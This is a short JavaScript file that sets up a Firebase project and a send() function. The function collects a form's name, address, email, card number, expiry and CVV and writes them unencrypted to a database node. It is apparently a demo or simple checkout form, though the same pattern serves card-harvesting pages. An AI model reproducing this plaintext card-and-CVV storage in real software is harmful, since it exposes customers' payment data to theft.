const firebaseConfig = {
  apiKey: "AIzaSyAaqbr_XDMvEm-D-9kP-gKcXfxGdrV-bd4",
  authDomain: "bus118-login.firebaseapp.com",
  projectId: "bus118-login",
  databaseURL: "https://bus118-login-default-rtdb.firebaseio.com/",
  storageBucket: "bus118-login.appspot.com",
  messagingSenderId: "311448466758",
  appId: "1:311448466758:web:6392b0b13bad0670ba6147"
};

const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child("userdetails");
detailsRef.on("child_added", function (snapshot, prevChildKey) {
  var newPost = snapshot.val();
});

function send() {
  var fname = document.getElementById("fname").value;
  var email = document.getElementById("email").value;
  var adr = document.getElementById("adr").value;
  var city = document.getElementById("city").value;
  var state = document.getElementById("state").value;
  var zip = document.getElementById("zip").value;
  var cname = document.getElementById("cname").value;
  var ccnum = document.getElementById("ccnum").value;
  var expyear = document.getElementById("expyear").value;
  var cvv = document.getElementById("cvv").value;

  detailsRef.push().set({
    fname: fname,
    email: email,
    adr: adr,
    city: city,
    state: state,
    zip: zip,
    cname: cname,
    ccnum: ccnum,
    expyear: expyear,
    cvv: cvv,
  });
}
